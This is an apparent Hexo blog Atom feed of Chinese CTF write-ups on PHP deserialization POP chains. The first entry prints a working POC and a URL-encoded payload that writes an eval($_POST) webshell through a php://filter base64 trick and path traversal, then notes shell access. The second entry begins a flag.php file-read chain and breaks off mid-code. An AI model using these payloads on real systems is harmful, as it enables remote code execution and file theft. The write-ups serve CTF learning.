<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S-H-BF</title>
  
  <subtitle>Sonder39的博客</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-02-29T12:18:01.000Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Sonder39</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>serDemo4 buu 2020新春红包题</title>
    <link href="http://example.com/2023/12/22/serDemo4/"/>
    <id>http://example.com/2023/12/22/serDemo4/</id>
    <published>2023-12-22T13:13:26.000Z</published>
    <updated>2024-02-29T12:18:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;dirname&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;basename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;extension&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;mimetype&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;visibility&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$cache_filename</span>, -<span class="title function_ invoke__">strlen</span>(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache_filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getExpireTime</span>(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>] = <span class="number">111</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;strval&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;/../c.php/.&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="number">111</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;cache = <span class="keyword">array</span>(<span class="string">&#x27;111&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;path&quot;</span>=&gt;<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&quot;</span>));</span><br><span class="line"><span class="variable">$a</span>-&gt;complete = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A4%3A%7Bs%3A13%3A%22data_compress%22%3Bb%3A0%3Bs%3A6%3A%22expire%22%3Bi%3A111%3Bs%3A9%3A%22serialize%22%3Bs%3A6%3A%22strval%22%3Bs%3A6%3A%22prefix%22%3Bs%3A58%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Duploads%2F%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A11%3A%22%2F..%2Fc.php%2F.%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A111%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A1%3A%7Bi%3A111%3Ba%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A32%3A%22PD9waHAgZXZhbCgkX1BPU1RbY10pOz8%2B%22%3B%7D%7Ds%3A8%3A%22complete%22%3Bs%3A1%3A%222%22%3B%7D</span><br></pre></td></tr></table></figure><p>将<code>payload</code>传入，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A::__destruct</span><br><span class="line">A::save</span><br><span class="line">A::getForStorage</span><br><span class="line">A::cleanContents</span><br><span class="line">B::set</span><br><span class="line">B::getExpireTime</span><br><span class="line">B::getCacheKey</span><br><span class="line">B::serialize</span><br></pre></td></tr></table></figure><p>用蚁剑访问<code>/uploads/c.php</code> 即可拿到shell</p><p>PS：可以看到是否上传，不过这里代码没写好，还需要刷新一次才会显示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads中的文件: </span><br><span class="line">c.php</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>从file_put_contents函数逆推，这里被触发就有可能写入webshell。<br>该函数用到的函数名会被getCacheKey处理一下，文件名来源于A中的key属性。<br>该函数中被写入的值来源于data变量，data变量由A中的contents经过serialize处理得到，serialize是一个可控变量，可以自己选定函数名。<br>serialize处理后可以进行压缩，但是这里显然是不能让他压缩，直接把options[‘data_compress’]定义为false即可。</p><p>也就是说，A中传递过来contents和key参数给B的set方法做处理，如果能选定适当的serialize函数，构造合适的contents以及合适的文件名，那么就可以写入webshell，获取flag。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="comment">// key作文文件名</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">      <span class="comment">// /../用于绕过uniqid生成的随机值，后面的/.用来绕过文件名限制</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;/../c.php/.&#x27;</span>;</span><br><span class="line">      <span class="comment">// 随意的数值，这里似乎没啥用</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="number">111</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="comment">// 动态生成成员</span></span><br><span class="line"><span class="comment">// 用于触发save方法</span></span><br><span class="line"><span class="variable">$a</span>-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line"><span class="comment">// 处理之后得到contents，path是一个base64值</span></span><br><span class="line"><span class="comment">// &lt;?php eval($_POST[c]);?&gt;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;cache = <span class="keyword">array</span>(<span class="string">&#x27;111&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;path&quot;</span>=&gt;<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&quot;</span>));</span><br><span class="line"><span class="comment">// 这个并没有什么用，只是用来添加到json中，随便设</span></span><br><span class="line"><span class="variable">$a</span>-&gt;complete = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="comment">// 禁止压缩</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">// 随意的数值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>] = <span class="number">111</span>;</span><br><span class="line">      <span class="comment">// serialize的方法</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;strval&#x27;</span>;</span><br><span class="line">      <span class="comment">// 用来确定写入文件的地址</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<strong><a href="https://www.cnblogs.com/kevinbruce656/p/12713474.html">https://www.cnblogs.com/kevinbruce656/p/12713474.html</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="buu新春红包题2020" scheme="http://example.com/tags/buu%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%982020/"/>
    
  </entry>
  
  <entry>
    <title>serDemo3 pop链</title>
    <link href="http://example.com/2023/12/22/serDemo3/"/>
    <id>http://example.com/2023/12/22/serDemo3/</id>
    <published>2023-12-22T13:13:25.000Z</published>
    <updated>2024-02-29T12:17:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serDemo3"><a href="#serDemo3" class="headerlink" title="serDemo3"></a>serDemo3</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span> . <span class="variable language_">$this</span>-&gt;source . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;系统检测到可疑字段，启动了查杀程序\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;     </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title 